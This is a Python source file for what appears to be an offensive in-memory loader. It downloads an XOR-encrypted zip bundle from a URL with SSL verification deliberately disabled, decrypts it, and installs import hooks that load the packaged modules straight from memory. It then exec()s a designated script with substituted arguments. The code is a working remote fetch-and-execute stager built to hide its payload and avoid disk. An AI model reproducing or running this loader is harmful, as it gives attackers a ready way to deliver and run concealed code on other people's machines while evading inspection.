import os
import importlib
import zipfile
import sys
import io
import json
import shlex
import urllib.request
import ssl

class ZipImportError(ImportError):
    """Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package

#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]

class CFinder(object):
    """Import Hook"""
    def __init__(self, repoName):
        self.repoName = repoName
        self._source_cache = {}

    def _get_info(self, repoName, fullname):
        """Search for the respective package or module in the zipfile object"""
        parts = fullname.split('.')
        submodule = parts[-1]
        modulepath = '/'.join(parts)

        #check to see if that specific module exists

        for suffix, is_package in _search_order:
            relpath = modulepath + suffix
            try:
                moduleRepo[repoName].getinfo(relpath)
            except KeyError:
                pass
            else:
                return submodule, is_package, relpath

        #Error out if we can find the module/package
        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
        raise ZipImportError(msg)

    def _get_source(self, repoName, fullname):
        """Get the source code for the requested module"""
        submodule, is_package, relpath = self._get_info(repoName, fullname)
        fullpath = '%s/%s' % (repoName, relpath)
        if relpath in self._source_cache:
            source = self._source_cache[relpath]
            return submodule, is_package, fullpath, source
        try:
            ### added .decode
            source =  moduleRepo[repoName].read(relpath).decode()
            source = source.replace('\r\n', '\n')
            source = source.replace('\r', '\n')
            self._source_cache[relpath] = source
            return submodule, is_package, fullpath, source
        except:
            raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

    def find_module(self, fullname, path=None):

        try:
            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        except ImportError:
            return None
        else:
            return self

    def load_module(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        code = compile(source, fullpath, 'exec')
        spec = importlib.util.spec_from_loader(fullname, loader=None)
        mod = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
        mod.__loader__ = self
        mod.__file__ = fullpath
        mod.__name__ = fullname
        if is_package:
            mod.__path__ = [os.path.dirname(mod.__file__)]
        exec(code,mod.__dict__)
        return mod

    def get_data(self, fullpath):

        prefix = os.path.join(self.repoName, '')
        if not fullpath.startswith(prefix):
            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
        relpath = fullpath[len(prefix):]
        try:
            return moduleRepo[self.repoName].read(relpath)
        except KeyError:
            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

    def is_package(self, fullname):
        """Return if the module is a package"""
        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        return is_package

    def get_code(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        return compile(source, fullpath, 'exec')

def install_hook(repoName):
    if repoName not in _meta_cache:
        finder = CFinder(repoName)
        _meta_cache[repoName] = finder
        sys.meta_path.append(finder)

def remove_hook(repoName):
    if repoName in _meta_cache:
        finder = _meta_cache.pop(repoName)
        sys.meta_path.remove(finder)

def hook_routine(fileName,zip):
    zf=zipfile.ZipFile(io.BytesIO(zip), 'r')
    moduleRepo[fileName]=zf
    install_hook(fileName)

def encrypt_decrypt(input_data, key, cipher='xor'):
    if cipher == 'xor':
        key = [ord(c) for c in key]
        key_len = len(key)
        return bytes([b ^ key[i % key_len] for i, b in enumerate(input_data)])

def run_module_locally(enc_zip_path, key, module_args):
    #decrypt
    with open(enc_zip_path, "rb") as file:
        zip_content = encrypt_decrypt(file.read(), key)
    
    run_module(zip_content, module_args)

def run_module_remotely(url, key, module_args):
    #decrypt
    #with open(enc_zip_path, "rb") as file:
        #zip_content = encrypt_decrypt(file.read(), key)
    
    # print(f'[*] Downloading the bundle from: {url}')
    # response = requests.get(url, verify=False)

    # Create a context to bypass SSL verification
    context = ssl._create_unverified_context()
    with urllib.request.urlopen(url, context=context) as response:
        file_data = response.read()

    zip_content = encrypt_decrypt(file_data, key)
    run_module(zip_content, module_args)

def run_module(enc_zip_conent,  module_args):
    script_content = ''
    
    zf = zipfile.ZipFile(io.BytesIO(enc_zip_conent), 'r')
    module_settings = json.loads(zf.read('module.json').decode())

    for name in module_settings['load_dependencies']:
        print(f"[*] Loading in memory module package: {name}")
        nested_zip_data = zf.read(name + '.zip')
        hook_routine(name, nested_zip_data)
    
    for name in module_settings['unpack_dependencies']:
        print(f'[*] Unpacking module: {name}')
        nested_zip_data = zf.read(name + '.zip')

        with zipfile.ZipFile(io.BytesIO(nested_zip_data), 'r') as z:
            z.extractall(os.getcwd())
    
    sys.path.insert(0, os.getcwd())
    script_content = zf.read(module_settings['pyfile'])
    
    original_argv = sys.argv
    sys.argv = module_args
    namespace = globals().copy()
    exec(script_content, namespace)
    sys.argv = original_argv
    sys.exit()

# module_args = sys.argv[1:]
# run_module_locally(sys.argv[1], key='123', module_args=module_args)